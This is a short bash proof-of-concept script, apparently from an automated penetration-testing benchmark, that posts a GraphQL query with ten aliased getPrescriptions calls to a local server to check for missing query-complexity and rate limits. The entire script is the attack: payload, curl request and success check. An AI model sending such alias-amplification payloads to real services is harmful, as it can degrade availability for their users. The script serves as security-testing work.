#!/bin/bash
# POC: Demonstrates GraphQL DoS vulnerability by sending multiple aliased queries (10 aliases of getPrescriptions) in a single request to exhaust server resources without rate limiting or complexity checks.
# Target: ./repo
# Created: 2025-11-10T18:29:39.927Z
# Session: benchmark-XBEN-007-24-mhtgyyde

# GraphQL DoS - Query Aliasing Attack POC
# This script demonstrates how query aliasing can multiply the processing load
# by executing 10 identical getPrescriptions queries in a single request

TARGET_URL="http://localhost:5003/graphql"
OUTPUT_FILE="/tmp/graphql_dos_output.txt"

echo "[*] GraphQL DoS - Query Aliasing Attack POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Testing query complexity limiting and rate limiting..."
echo ""

# Create the GraphQL query with 10 aliased getPrescriptions queries
# This multiplies the server processing load by executing the same query 10 times
GRAPHQL_PAYLOAD='{"query":"query{a1:getPrescriptions(userId:1){id} a2:getPrescriptions(userId:1){id} a3:getPrescriptions(userId:1){id} a4:getPrescriptions(userId:1){id} a5:getPrescriptions(userId:1){id} a6:getPrescriptions(userId:1){id} a7:getPrescriptions(userId:1){id} a8:getPrescriptions(userId:1){id} a9:getPrescriptions(userId:1){id} a10:getPrescriptions(userId:1){id}}"}'

echo "[*] Sending payload with 10 query aliases..."
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d "$GRAPHQL_PAYLOAD" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "[*] HTTP Response Code: $HTTP_CODE"
echo ""
echo "[*] Response Body (first 2000 chars):"
echo "$BODY" | head -c 2000
echo ""
echo ""

# Check if response indicates successful processing of all aliases
if echo "$BODY" | grep -q "a1"; then
    echo "[+] SUCCESS: Server processed all 10 aliased queries"
    echo "[+] Vulnerability Confirmed: Query aliasing not limited"
    
    # Count the number of items returned
    ITEM_COUNT=$(echo "$BODY" | grep -o '"id"' | wc -l)
    echo "[+] Total 'id' fields in response: $ITEM_COUNT"
    
    if [ "$ITEM_COUNT" -gt 100 ]; then
        echo "[+] Response contains 100+ items (multiple prescriptions multiplied by aliases)"
        echo "[+] DoS Vector: Query aliasing successfully multiplies server load"
    fi
    
    exit 0
else
    echo "[-] FAILED: Unexpected response format"
    echo "[-] Full response:"
    echo "$BODY"
    exit 1
fi